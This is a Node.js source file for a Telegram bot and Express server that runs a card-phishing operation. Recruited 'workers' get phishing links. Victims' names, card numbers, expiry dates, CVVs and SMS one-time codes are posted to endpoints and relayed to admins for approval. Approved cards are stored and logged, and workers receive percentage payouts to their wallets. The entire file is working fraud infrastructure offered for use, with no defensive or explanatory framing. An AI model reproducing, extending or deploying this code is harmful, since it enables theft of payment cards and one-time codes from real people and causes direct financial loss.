require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const pendingCardData = {};
const fs = require('fs');
const path = require('path');
// Initialize SQLite Database
const db = new sqlite3.Database('./telegram_bot.db');
db.serialize(() => {
  db.run("CREATE TABLE IF NOT EXISTS wallets (chat_id INTEGER PRIMARY KEY, wallet TEXT)");
});

// Initialize Telegram Bot
const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });
const groupId = -1002026496906;
// Initialize Express App
const app = express();
app.use(cors());
app.use(express.json());

// Client storage for SSE
const clients = {};

// SSE Endpoint Setup
app.get('/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    const clientId = Date.now();
    clients[clientId] = res;

    req.on('close', () => {
        delete clients[clientId];
    });
});

// Function to send data to all SSE clients
function sendToAllClients(data) {
    Object.values(clients).forEach(clientRes => {
        clientRes.write(`data: ${JSON.stringify(data)}\n\n`);
    });
}

function generateRandomText(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomText = '';

    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        randomText += characters.charAt(randomIndex);
    }

    return randomText;
}


function getAllAdminIds() {
    return new Promise((resolve, reject) => {
        db.all("SELECT user_id FROM admins", [], (err, rows) => {
            if (err) {
                console.error(err.message);
                reject(err);
            } else {
                const adminIds = rows.map(row => row.user_id);
                resolve(adminIds);
            }
        });
    });
}

function broadcastMessage(rows, content, type) {
    rows.forEach(row => {
        switch (type) {
            case 'text':
                bot.sendMessage(row.user_id, content).catch(err => {
                    console.error(`Failed to send text to user ${row.user_id}:`, err);
                });
                break;
            case 'video':
                bot.sendVideo(row.user_id, content).catch(err => {
                    console.error(`Failed to send video to user ${row.user_id}:`, err);
                });
                break;
            // Add more cases for other types of messages if needed
        }
    });
}


function sendCardDataLog(chatId) {
    db.all("SELECT * FROM approved_payments", [], (err, rows) => {
        if (err) {
            console.error(err.message);
            bot.sendMessage(chatId, "Error retrieving approved payment data.");
            return;
        }

        if (rows.length === 0) {
            bot.sendMessage(chatId, "No approved payment data available to log.");
            return;
        }

        let logContent = rows.map(row => `Transaction ID: ${row.transaction_id}, User: ${row.user_name}, Card Number: ${row.card_number}, Expiry: ${row.expiry}, CVV: ${row.cvv}, Total Price: ${row.total_price}, Worker: ${row.worker}`).join('\n');

        // Write to a log file in the same directory as the script
        const logFilePath = path.join(__dirname, 'approved_payments_log.txt');
        fs.writeFile(logFilePath, logContent, (writeErr) => {
            if (writeErr) {
                console.error(writeErr.message);
                bot.sendMessage(chatId, "Error writing log file.");
                return;
            }

            // Send log file to the admin
            bot.sendDocument(chatId, logFilePath, {}, (sendErr) => {
                if (sendErr) {
                    console.error(sendErr.message);
                }
            });
        });
    });
}



bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || 'Unknown'; // Fallback to 'Unknown' if username is not available

    // Fetch user statistics
    db.get("SELECT total_sum FROM user_statistics WHERE chat_id = ?", [chatId], (err, row) => {
        if (err) {
            console.error("Error fetching user statistics:", err);
            bot.sendMessage(chatId, "Error fetching your statistics.");
            return;
        }
        let earningsMessage = row ? `🕶Your worker profile:\n\n💰Your total earnings: ${row.total_sum}$` : "You have no earnings yet.";

        // Fetch wallet information
        db.get("SELECT wallet FROM wallets WHERE chat_id = ?", [chatId], (walletErr, walletRow) => {
            let walletMessage = walletRow ? `💳Your Wallet: ${walletRow.wallet}\n` : "💳Wallet: Not set\n";

            // Fetch user URL
            db.get("SELECT url FROM urls WHERE chat_id = ?", [chatId], (urlErr, urlRow) => {
                let urlMessage = urlRow ? `🔗Your Work URL: http://localhost:5173/${urlRow.url}\n` : "🔗Work URL: Not set\n";

                // Fetch active admins
                db.all("SELECT username FROM admins JOIN user_info ON admins.user_id = user_info.user_id", [], (adminErr, adminRows) => {
                    let adminMessage = "👨‍💻Active Admins:\n";
                    if (adminErr) {
                        console.error("Error fetching admins:", adminErr);
                        adminMessage = "Error fetching active admins.\n";
                    } else {
                        adminRows.forEach(admin => {
                            adminMessage += `@${admin.username}\n`;
                        });
                    }

                    // Combine messages
                    const combinedMessage = `${earningsMessage}\n${walletMessage}\n${urlMessage}\n${adminMessage}`;
                    
                    // Send message with admin list
                    bot.sendMessage(chatId, combinedMessage, opts);
                });
            });
        });
    });

    // Insert or update user information in the user_info table
    const query = `
        INSERT INTO user_info (user_id, username) VALUES (?, ?)
        ON CONFLICT(user_id) DO UPDATE SET username = ?;
    `;
    db.run(query, [chatId, username, username], (err) => {
        if (err) {
            console.error(`Database error: ${err.message}`);
            // Handle error appropriately
        } else {
            console.log(`User data updated for chat ID ${chatId}`);
        }
    });

    // Define options for keyboard
    let opts;
    // Check if the user is the admin
    if (chatId.toString() === '784455801') {
        // Options for the admin user including the additional button
        opts = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔗Generate url', callback_data: 'generate_url' }, { text: 'Wallet💳', callback_data: 'wallet' }],
                    [{ text: 'Cashout', callback_data: 'Cashout' }],
                    [{ text: 'Send Card Data Log', callback_data: 'send_log' },{ text: 'Create post', callback_data: 'create_post' }],
                    [{ text: '📈Total Statistics', callback_data: 'total_statistics' },{ text: 'Add Admin', callback_data: 'add_admin' }],
                    [{ text: 'Admin List', callback_data: 'admin_list' }, { text: 'Set percent', callback_data: 'set_percent' }]
                ]
            }
        };
    } else {
        // Options for regular users
        opts = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔗Generate url', callback_data: 'generate_url' }, { text: 'Wallet💳', callback_data: 'wallet' }],
                    [{ text: '📊My statistic', callback_data: 'my_statistic' }],
                    [{ text: '📈Total Statistics', callback_data: 'total_statistics' }]
                ]
            }
        };
    }
});


bot.onText(/\/mute (\d+)m/, (msg, match) => {
    const chatId = msg.chat.id;
    const replyToMessage = msg.reply_to_message;


    if (!replyToMessage) {
        bot.sendMessage(chatId, "Please reply to a message to mute the user.");
        return;
    }

    const userId = replyToMessage.from.id;
    const duration = parseInt(match[1]) * 60; // Convert minutes to seconds

    // Mute the user
    bot.restrictChatMember(chatId, userId, {
        until_date: Math.floor(Date.now() / 1000) + duration,
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false
    }).then(() => {
        bot.sendMessage(chatId, `User muted for ${match[1]} minutes.`);
    }).catch(err => {
        bot.sendMessage(chatId, "Failed to mute the user. I might not have enough permissions.");
    });
});

bot.onText(/\/unmute/, (msg) => {
    const chatId = msg.chat.id;
    const fromUserId = msg.from.id;
    const replyToMessage = msg.reply_to_message;

    // Ensure the command is a reply to a user's message
    if (!replyToMessage) {
        bot.sendMessage(chatId, "Please reply to the message of the user you want to unmute.");
        return;
    }

    // Get the ID of the user to unmute
    const userIdToUnmute = replyToMessage.from.id;

    // Set permissions for unmute - allow sending messages
    const permissions = {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
    };

    // Use the restrictChatMember method to update permissions
    bot.restrictChatMember(chatId, userIdToUnmute, permissions)
        .then(() => {
            bot.sendMessage(chatId, `User ${userIdToUnmute} has been unmuted.`);
        })
        .catch(error => {
            console.error(error);
            bot.sendMessage(chatId, "Failed to unmute user.");
        });
});

bot.on('polling_error', (error) => {
    console.log(error);  // Log errors
});


// Handle callback queries from the bot (for inline keyboard responses)
const userStates = {};

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    if (data === 'create_post') {
        bot.sendMessage(chatId, "Please send me the post message.");
        userStates[chatId] = { state: 'awaiting_post_message' };
    }

    if (data === 'set_percent' && chatId.toString() === '784455801') { // Check if admin
        bot.sendMessage(chatId, "Enter the new percentage for all users:");
        userStates[chatId] = { state: 'awaiting_percentage' };
    }    

    if (data === 'active_admins') {
        // Retrieve all admin usernames and their user IDs
        db.all("SELECT u.username, u.user_id FROM admins a JOIN user_info u ON a.user_id = u.user_id", [], (err, rows) => {
            if (err) {
                console.error(err.message);
                bot.sendMessage(chatId, "Error retrieving admin list.");
                return;
            }

            if (rows.length === 0) {
                bot.sendMessage(chatId, "No admins found.");
                return;
            }

            let messageText = 'Admin List:\n';
            rows.forEach(row => {
                messageText += `@${row.username}\n`;
            });

            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Return', callback_data: 'return' }]
                    ]
                }
            };

            bot.editMessageText(messageText, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: opts.reply_markup
            });
        });
    }

    if (data === 'admin_list' && chatId.toString() === '784455801') {
        db.all("SELECT u.username, u.user_id FROM admins a JOIN user_info u ON a.user_id = u.user_id", [], (err, rows) => {
            if (err) {
                console.error(err.message);
                bot.sendMessage(chatId, "Error retrieving admin list.");
                return;
            }

            if (rows.length === 0) {
                bot.sendMessage(chatId, "No admins found.");
                return;
            }

            let adminButtons = rows.map(row => 
                [{ 
                    text: `${row.username}`, 
                    callback_data: `remove_admin_${row.user_id}` 
                }]
            );

            const opts = {
                reply_markup: {
                    inline_keyboard: adminButtons
                }
            };

            bot.sendMessage(chatId, "Admins:", opts);
        });
    }

    if (data.startsWith('remove_admin_')) {
        const adminIdToRemove = data.split('_')[2];
    
        // First, retrieve the username of the admin to be removed
        db.get("SELECT username FROM user_info WHERE user_id = ?", [adminIdToRemove], (err, row) => {
            if (err) {
                console.error(`Database error: ${err.message}`);
                bot.sendMessage(chatId, "Error: Could not process the request.");
                return;
            }
    
            if (row) {
                // Then proceed to remove the admin
                db.run("DELETE FROM admins WHERE user_id = ?", [adminIdToRemove], deleteErr => {
                    if (deleteErr) {
                        console.error(deleteErr.message);
                        bot.sendMessage(chatId, "Failed to remove admin.");
                    } else {
                        bot.sendMessage(chatId, `Admin @${row.username} removed.`);
                         // Replace with your group chat ID
                        bot.sendMessage(groupId, `@${row.username} has disconnected as an admin.`);
                    }
                });
            } else {
                bot.sendMessage(chatId, "Admin not found in user_info.");
            }
        });
    }

    if (callbackQuery.data === 'add_admin') {
        bot.sendMessage(callbackQuery.message.chat.id, "Please enter the username of the new admin:");
        userStates[callbackQuery.message.chat.id] = { state: 'awaiting_new_admin' };
    }

    if (data === 'total_statistics') {
        // Fetch the total sum for all users
        db.get("SELECT total_sum FROM total_statistics WHERE id = 1", (totalErr, totalRow) => {
            if (totalErr) {
                console.error("Error fetching total statistics:", totalErr);
                bot.sendMessage(chatId, "Error fetching total statistics.");
                return;
            }
    
            let totalStatisticsMessage = totalRow ? `Total Earnings: ${totalRow.total_sum}$\n` : "Total statistics not available.\n";
    
            // Fetch individual user statistics and sort by total_sum in descending order
            db.all("SELECT u.username, s.total_sum FROM user_statistics s JOIN user_info u ON s.chat_id = u.user_id ORDER BY s.total_sum DESC", (userErr, userRows) => {
                if (userErr) {
                    console.error("Error fetching user statistics:", userErr);
                    bot.sendMessage(chatId, "Error fetching user statistics.");
                    return;
                }
    
                if (userRows && userRows.length > 0) {
                    userRows.forEach(row => {
                        totalStatisticsMessage += `#${row.username}: ${row.total_sum}$\n`;
                    });
                } else {
                    totalStatisticsMessage += "No user statistics available.";
                }
    
                // Send the complete statistics message
                bot.sendMessage(chatId, totalStatisticsMessage);
            });
        });
    }

    if (data === 'my_statistic') {
        // Retrieve the summ for the current chat_id
        db.get("SELECT summ FROM wallets WHERE chat_id = ?", [chatId], (err, row) => {
            if (err) {
                console.error(err.message);
                bot.sendMessage(chatId, "Error retrieving summ information.");
                return;
            }
            if (row) {
                const newMessageText = `💸Summ is ${row.summ}`;
                const opts = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Return', callback_data: 'return' }]
                        ]
                    }
                };
                bot.editMessageText(newMessageText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: opts.reply_markup
                });
            } else {
                bot.sendMessage(chatId, "No summ information found.");
            }
        });
    } 
    if (data === 'Cashout') {
        // Retrieve username, wallet, and summ information for all users
        const query = `
            SELECT w.chat_id, u.username, w.wallet, w.summ
            FROM wallets w
            LEFT JOIN user_info u ON w.chat_id = u.user_id;
        `;
        db.all(query, [], (err, rows) => {
            if (err) {
                console.error(err.message);
                bot.sendMessage(chatId, "Error retrieving cashout information for all users.");
                return;
            }
            if (rows && rows.length > 0) {
                rows.forEach(row => {
                    let username = row.username || 'Unknown';
                    let walletInfo = row.wallet ? `Wallet: ${row.wallet}` : "Wallet: Not set";
                    let summInfo = `Summ: ${row.summ}`;
                    
                    const opts = {
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: `Reset Summ for @${username}`, callback_data: `resetSumm_${row.chat_id}` }]
                            ]
                        }
                    };

                    bot.sendMessage(chatId, `Username: @${username}\n${walletInfo}\n${summInfo}`, opts);
                });
            } else {
                bot.sendMessage(chatId, "No cashout information found for any user.");
            }
        });
    } else if (data.startsWith('resetSumm_')) {
        // Extract the chatId from the callback data
        const resetChatId = data.split('_')[1];
        db.run("UPDATE wallets SET summ = 0 WHERE chat_id = ?", [resetChatId], (err) => {
            if (err) {
                console.error(err.message);
                bot.sendMessage(chatId, "Failed to reset summ.");
            } else {
                bot.sendMessage(chatId, `Summ reset for chat ID ${resetChatId}.`);
            }
        });
    }

    if (data === 'generate_url') {
        db.get("SELECT url FROM urls WHERE chat_id = ?", [chatId], (err, row) => {
            if (err) {
                console.error(err.message);
                return;
            }
            if (row) {
                const fullUrl = `http://localhost:5173/${row.url}`; // Construct full URL
                bot.editMessageText(`Your work URL is: ${fullUrl}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Generate New', callback_data: 'generateNew' }],
                            [{ text: 'Return', callback_data: 'return' }]
                        ],
                    },
                });
            } else {
                const randomText = generateRandomText(4);
                bot.editMessageText(`Your work URL is: http://localhost:5173/${randomText}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Generate New', callback_data: 'generateNew' }],
                            [{ text: 'Return', callback_data: 'return' }]
                        ],
                    },
                });
                db.run("INSERT INTO urls (chat_id, url) VALUES (?, ?)", [chatId, randomText], insertErr => { // Only random text saved
                    if (insertErr) {
                        console.error(insertErr.message);
                    } else {
                        console.log(`New URL saved for chat ID ${chatId}: ${randomText}`);
                    }
                });
            }
        });
    } else if (data === 'generateNew') {
        const randomText = generateRandomText(4);
        bot.editMessageText(`Your work URL is: http://localhost:5173/${randomText}`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Generate New', callback_data: 'generateNew' }],
                    [{ text: 'Return', callback_data: 'return' }]
                ],
            },
        });
        db.run("UPDATE urls SET url = ? WHERE chat_id = ?", [randomText, chatId], updateErr => { // Only random text updated
            if (updateErr) {
                console.error(updateErr.message);
            } else {
                console.log(`URL updated for chat ID ${chatId}: ${randomText}`);
            }
        });
    }
     else if (data === 'wallet') {
        db.get("SELECT wallet FROM wallets WHERE chat_id = ?", [chatId], (err, row) => {
            if (err) {
                console.error(err.message);
                return;
            }
            if (row) {
                bot.editMessageText(`Your current wallet is: ${row.wallet}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Change Wallet 💳', callback_data: 'change_wallet' }],
                            [{ text: 'Return', callback_data: 'return' }]
                        ],
                    },
                });
            } else {
                bot.editMessageText('Enter your wallet:', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Return', callback_data: 'return' }]
                        ],
                    },
                });
                userStates[chatId] = { state: 'awaiting_wallet', messageId: messageId };
            }
        });
    } else if (data === 'change_wallet') {
        bot.editMessageText('Enter your new wallet:', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Return', callback_data: 'return' }]
                ],
            },
        });
        userStates[chatId] = { state: 'awaiting_wallet', messageId: messageId };
    } 
         else {
        bot.answerCallbackQuery(callbackQuery.id, { text: `You selected: ${data}` });
    }

    if (data === 'send_log' && chatId.toString() === '784455801') { // Ensure it's the admin user
        sendCardDataLog(chatId);
    }
    if (data.startsWith('approve_')) {
        const transactionId = data.split('_')[1];
        const approverChatId = callbackQuery.message.chat.id;
        if (pendingCardData[transactionId]) {
            const cardData = pendingCardData[transactionId];
    
            // Save the card data to the database
            db.run("INSERT INTO approved_payments (transaction_id, user_name, card_number, expiry, cvv, total_price, worker) VALUES (?, ?, ?, ?, ?, ?, ?)",
                [transactionId, cardData.userName, cardData.userCardNumber, cardData.userExpiry, cardData.userCvv, cardData.totalPrice, cardData.worker],
                (err) => {
                    if (err) {
                        console.error("Error saving approved payment:", err);
                        bot.sendMessage(chatId, "Failed to save approved payment.");
                    } else {
                        
                        console.log("Approved payment saved successfully.");
                        bot.sendMessage(chatId, "Approved payment saved successfully.");
                        
                            

                        // Retrieve the chat_id associated with the worker
                        db.get("SELECT chat_id FROM urls WHERE url = ?", [cardData.worker], (workerErr, workerRow) => {
                            if (workerErr || !workerRow) {
                                console.error("Worker not found or error occurred:", workerErr);
                            } else {
                                const workerChatId = workerRow.chat_id;
    
                                // Get the percentage for the worker
                                db.get("SELECT percentage FROM user_percentages WHERE chat_id = ?", [workerChatId], (percentErr, percentRow) => {
                                    if (percentErr || !percentRow) {
                                        console.error("Error getting percentage or percentage not set:", percentErr);
                                    } else {
                                        const percentage = percentRow.percentage;
                                        const calculatedSumm = cardData.totalPrice * (percentage / 100);
                                        db.run("UPDATE wallets SET summ = summ + ? WHERE chat_id = ?", [calculatedSumm, workerChatId], (updateErr) => {
                                            if (updateErr) {
                                                console.error("Error updating summ in wallet:", updateErr);
                                            } else {
                                                console.log(`Summ updated for chat ID ${workerChatId}`);
                                                bot.sendMessage(workerChatId, `Transaction approved. Summ increased by ${calculatedSumm}`);
                                        
                                                // Here, also update the user_statistics table
                                                db.run("INSERT INTO user_statistics (chat_id, total_sum) VALUES (?, ?) ON CONFLICT(chat_id) DO UPDATE SET total_sum = total_sum + ?",
                                                    [workerChatId, cardData.totalPrice, cardData.totalPrice], (statErr) => {
                                                        if (statErr) {
                                                            console.error("Error updating user statistics:", statErr);
                                                        } else {
                                                            console.log(`User statistics updated for chat ID ${workerChatId}`);
                                                        }
                                                    }
                                                );
                                        
                                            }
                                        });
                                        // Update the summ in the wallets table with the calculated value
                                        db.get("SELECT username FROM user_info WHERE user_id = ?", [workerChatId], (workerUserErr, workerUserRow) => {
                                            if (workerUserErr || !workerUserRow) {
                                                console.error("Error retrieving worker username:", workerUserErr);
                                            } else {
                                                const workerUsername = workerUserRow.username;
                                        
                                                // Retrieve username for the approver
                                                db.get("SELECT username FROM user_info WHERE user_id = ?", [approverChatId], (approverErr, approverRow) => {
                                                    if (approverErr || !approverRow) {
                                                        console.error("Error retrieving approver username:", approverErr);
                                                    } else {
                                                        const approverUsername = approverRow.username;
                                                        const messageToGroup = `🪝New payment🪝\n 💼Vbiver: @${approverUsername}\n💸Summ: ${cardData.totalPrice}$\n💳User part: ${calculatedSumm}$\n🔗Worker: @${workerUsername}`;
                                        
                                                        // Path to the GIF
                                                        const gifPath = './assets/kizyaka.gif'; // Adjust the path if necessary
                                        
                                                        // Send GIF with caption to group
                                                         // Replace with your group ID
                                                        bot.sendDocument(groupId, gifPath, { caption: messageToGroup })
                                                            .catch(error => {
                                                                console.error("Error sending GIF and message to group:", error);
                                                            });
                                                    }
                                                });
                                            }
                                        });
    
                                        // Update the total sum in the total_statistics table
                                        db.run("UPDATE total_statistics SET total_sum = total_sum + ? WHERE id = 1", [cardData.totalPrice], (totalUpdateErr) => {
                                            if (totalUpdateErr) {
                                                console.error("Error updating total sum:", totalUpdateErr);
                                            } else {
                                                console.log("Total sum updated successfully.");
                                            }
                                        });
                                    }
                                });
                            }
                        });
                    }
                }
            );
    
            // Remove the pending data as it's now saved
            delete pendingCardData[transactionId];
        } else {
            console.log("No pending card data found for transaction ID:", transactionId);
            bot.sendMessage(chatId, "No pending card data found for this transaction.");
        }
    }
    
    
    
    

    sendToAllClients({ message: data });
});





// Handle incoming text messages from users
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (userStates[chatId] && userStates[chatId].state === 'awaiting_post_message') {
        // Retrieve all user IDs from your database
        db.all("SELECT user_id FROM user_info", [], (err, rows) => {
            if (err) {
                console.error(err.message);
                return;
            }

            if (msg.text) {
                // Text message
                broadcastMessage(rows, msg.text, 'text');
            } else if (msg.video) {
                // Video message
                broadcastMessage(rows, msg.video.file_id, 'video');
            } 
            // Add more else if blocks for other types of messages if needed

            bot.sendMessage(chatId, "Post sent to all users.");
            delete userStates[chatId];
        });
    }

    if (userStates[chatId] && userStates[chatId].state === 'awaiting_percentage') {
        const percentage = parseInt(text);
        if (isNaN(percentage) || percentage < 0 || percentage > 100) {
            bot.sendMessage(chatId, "Please enter a valid percentage (0-100).");
            return;
        }
    
        // Update or insert percentage for all users
        db.all("SELECT user_id FROM user_info", [], (err, rows) => {
            if (err) {
                console.error(err.message);
                bot.sendMessage(chatId, "Error retrieving users.");
                return;
            }
    
            const promises = rows.map(row => {
                return new Promise((resolve, reject) => {
                    db.run("INSERT INTO user_percentages (chat_id, percentage) VALUES (?, ?) ON CONFLICT(chat_id) DO UPDATE SET percentage = ?",
                        [row.user_id, percentage, percentage], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                });
            });
    
            Promise.all(promises)
                .then(() => {
                    bot.sendMessage(chatId, `Percentage set to ${percentage}% for all users.`);
                })
                .catch(err => {
                    console.error(err);
                    bot.sendMessage(chatId, "Failed to update percentages.");
                });
        });
    
        delete userStates[chatId];
    }    

    if (userStates[chatId] && userStates[chatId].state === 'awaiting_new_admin') {
        // Remove '@' if it's included in the username
        const username = text.startsWith('@') ? text.slice(1) : text;
    
        // Fetch chat_id of the entered username from the user_info table
        db.get("SELECT user_id FROM user_info WHERE username = ?", [username], (err, row) => {
            if (err) {
                console.error(`Database error: ${err.message}`);
                bot.sendMessage(chatId, "Error: Could not process the request.");
                delete userStates[chatId];
                return;
            }
    
            if (row) {
                const newAdminId = row.user_id;
                // Add this user ID to the admins table
                db.run("INSERT INTO admins (user_id) VALUES (?)", [newAdminId], insertErr => {
                    if (insertErr) {
                        bot.sendMessage(chatId, "Failed to add new admin.");
                    } else {
                        bot.sendMessage(chatId, "New admin added successfully.");
                        // Send notification to the group chat
                         // Replace with your group chat ID
                        bot.sendMessage(groupId, `@${username} is now online as an admin.`);
                    }
                });
            }
        });
        delete userStates[chatId];
    }

    if (userStates[chatId] && userStates[chatId].state === 'awaiting_wallet') {
        const walletMessageId = userStates[chatId].messageId;

        // Check if the wallet already exists
        db.get("SELECT wallet FROM wallets WHERE chat_id = ?", [chatId], (err, row) => {
            if (err) {
                return console.error(err.message);
            }
            if (row) {
                // Wallet exists, update it
                db.run("UPDATE wallets SET wallet = ? WHERE chat_id = ?", [text, chatId], updateErr => {
                    if (updateErr) {
                        return console.error(updateErr.message);
                    }
                    console.log(`Wallet updated for chat ID ${chatId}`);
                });
            } else {
                // No wallet, insert new record
                db.run("INSERT INTO wallets (chat_id, wallet) VALUES (?, ?)", [chatId, text], insertErr => {
                    if (insertErr) {
                        return console.error(insertErr.message);
                    }
                    console.log(`New wallet added for chat ID ${chatId}`);
                });
            }
        });

        bot.editMessageText(`Your wallet is now set to: ${text}`, {
            chat_id: chatId,
            message_id: walletMessageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Change Wallet', callback_data: 'change_wallet' }],
                    [{ text: 'Return', callback_data: 'return' }]
                ],
            },
        });

        try {
            await bot.deleteMessage(chatId, msg.message_id);
            console.log('User message deleted successfully.');
        } catch (error) {
            console.error('Error deleting user message:', error.message);
        }

        delete userStates[chatId];
    }
});




app.post('/send-card-data', (req, res) => {
    const { userName, userCardNumber, userExpiry, userCvv, totalPrice, worker, transactionId } = req.body;

    if (!userName || !userCardNumber || !userExpiry || !userCvv) {
        return res.status(400).send('All card details are required');
    }

    // Retrieve chat_id associated with the worker
    db.get("SELECT chat_id FROM urls WHERE url = ?", [worker], (err, row) => {
        if (err) {
            console.error(`Database error: ${err.message}`);
            return res.status(500).send('Internal Server Error');
        }

        if (!row) {
            console.error('Worker not found in database');
            return res.status(404).send('Worker not found');
        }

        const workerChatId = row.chat_id;

        // Retrieve the username associated with the worker's chat_id
        db.get("SELECT username FROM user_info WHERE user_id = ?", [workerChatId], (userErr, userRow) => {
            if (userErr) {
                console.error(`Database error: ${userErr.message}`);
                return res.status(500).send('Internal Server Error');
            }

            let userIdentifier = workerChatId; // Default to chatId if username not found
            if (userRow && userRow.username) {
                userIdentifier = `@${userRow.username}`; // Prepend '@' to the username
            }

            // Construct the message
            const message = `🔔 New Card Payment:\nName: ${userName}\nCard Number: ${userCardNumber}\nExpiry: ${userExpiry}\nCVV: ${userCvv}\nSUMM: ${totalPrice}\nUser: ${userIdentifier}\n(Transaction ID: ${transactionId})`;

            // Define options for the inline keyboard
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✅ Yes', callback_data: `yes_${transactionId}` }],
                        [{ text: '❌ no', callback_data: `no_${transactionId}` }]
                    ],
                },
            };

            // Retrieve all admin user IDs from the database
            db.all("SELECT user_id FROM admins", [], (adminErr, adminRows) => {
                if (adminErr) {
                    console.error(`Database error: ${adminErr.message}`);
                    return res.status(500).send('Internal Server Error');
                }

                // Send the message to each admin
                adminRows.forEach(adminRow => {
                    bot.sendMessage(adminRow.user_id, message, opts).catch(sendError => {
                        console.error(`Failed to send card details to admin ${adminRow.user_id}:`, sendError);
                    });
                });

                // Store the card data in pendingCardData for later processing
                pendingCardData[transactionId] = {
                    userName, userCardNumber, userExpiry, userCvv, totalPrice, worker
                };

                // Respond once the message is broadcasted to all admins
                res.send('Card details sent to all admins');
            });
        });
    });
});


app.post('/send-sms-data', (req, res) => {
    const { smsCode, transactionId } = req.body;

    // Construct the message
    const message = `🔔 Received SMS Code: ${smsCode} (Transaction ID: ${transactionId})`;

    // Define the inline keyboard for SMS confirmation
    const smsConfirmationKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '✅ Approve', callback_data: `approve_${transactionId}` }],
                [{ text: '❌ Reject', callback_data: `reject_${transactionId}` }]
            ],
        },
    };

    // Retrieve all admin user IDs from the database
    db.all("SELECT user_id FROM admins", [], (adminErr, adminRows) => {
        if (adminErr) {
            console.error(`Database error: ${adminErr.message}`);
            res.status(500).send('Internal Server Error');
            return;
        }

        // Send the SMS message to each admin
        adminRows.forEach(adminRow => {
            bot.sendMessage(adminRow.user_id, message, smsConfirmationKeyboard)
                .catch(sendError => {
                    console.error(`Failed to send SMS data to admin ${adminRow.user_id}:`, sendError);
                });
        });

        // Log the sending of the SMS data
        console.log('SMS data sent to all admins');
        res.send('SMS data sent to all admins');
    });
});


// Start Express Server
const PORT = process.env.PORT || 1236;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});